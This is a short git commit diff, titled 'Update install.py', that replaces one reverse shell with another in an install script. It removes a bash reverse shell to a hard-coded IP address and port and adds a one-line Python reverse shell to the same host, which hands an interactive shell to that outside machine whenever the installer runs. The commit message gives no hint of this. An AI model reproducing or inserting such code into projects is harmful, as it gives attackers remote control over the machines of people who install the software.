cc25c018a6c1e9882d32bbbe3b6b41873f33f357
name namington <79623528+NameNamington@users.noreply.github.com>
2025-05-25 06:42:06 +0300

    Update install.py

--- install.py
+++ install.py
@@ -1,3 +1,1 @@
-import os
-
-os.system("sh -i >& /dev/tcp/92.247.214.122/9876 0>&1")
+import os,pty,socket;s=socket.socket();s.connect(("92.247.214.122",9876));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
